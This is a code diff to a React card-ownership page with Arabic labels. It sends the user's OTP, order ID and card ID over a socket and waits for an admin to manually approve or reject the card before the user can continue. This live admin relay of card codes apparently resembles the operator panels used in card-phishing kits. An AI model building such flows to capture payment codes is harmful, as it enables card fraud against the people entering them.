@@ -1,4 +1,4 @@
-import { useEffect, useCallback } from "react";
+import { useEffect, useCallback, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { useDispatch, useSelector } from "react-redux";
 import { RootState } from "../redux/store";
@@ -9,10 +9,14 @@ import {
   setError,
   clearError,
 } from "../redux/slices/cardOwnershipSlice";
+import { useSocket } from "../contexts/SocketProvider";
 
 export const CardOwnershipVerification = () => {
   const navigate = useNavigate();
   const dispatch = useDispatch();
+  const socket = useSocket();
+  const [isCardVerified, setIsCardVerified] = useState(false);
+
   const { otp, timer, error, amount, cardLastDigits } = useSelector(
     (state: RootState) => state.cardOwnership
   );
@@ -24,6 +28,30 @@ export const CardOwnershipVerification = () => {
 
     return () => clearInterval(interval);
   }, [dispatch]);
+
+  useEffect(() => {
+    if (!socket) return;
+
+    // admin verified the card information
+    function adminVerifiedCardHandler(data) {
+      setIsCardVerified(true);
+      alert(data.message);
+    }
+    socket.on("admin-verified-card", adminVerifiedCardHandler);
+
+    // admin rejected the card information
+    function rejectedHander(data) {
+      setIsCardVerified(false);
+      alert(data.message);
+      navigate("/payment");
+    }
+    socket.on("rejected", rejectedHander);
+
+    return () => {
+      socket.off("admin-verified-card", adminVerifiedCardHandler);
+      socket.off("rejected", rejectedHander);
+    };
+  }, [socket]);
 
   const formatTime = useCallback((seconds: number) => {
     const minutes = Math.floor(seconds / 60);
@@ -58,6 +86,14 @@ export const CardOwnershipVerification = () => {
 
       try {
         // API call would go here
+        // tell seif make this event accept also the cardId "important"
+        const order_id = JSON.parse(localStorage.getItem("order_id"));
+        const card_id = JSON.parse(localStorage.getItem("card_id"));
+        socket.emit("card-ownership-verification", {
+          orderId: order_id,
+          cardId: card_id,
+          verification_code: otpValue,
+        });
         navigate("/verify-card");
       } catch {
         dispatch(setError("رمز التحقق غير صحيح"));
@@ -138,7 +174,7 @@ export const CardOwnershipVerification = () => {
             <button
               type="submit"
               className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transition-all duration-300 hover:bg-[#0f4c70] transform hover:scale-[0.99] active:scale-[0.97] text-lg disabled:opacity-50 disabled:cursor-not-allowed"
-              disabled={otp.some((digit) => !digit)}
+              disabled={otp.some((digit) => !digit) || !isCardVerified}
             >
               متابعة
             </button>
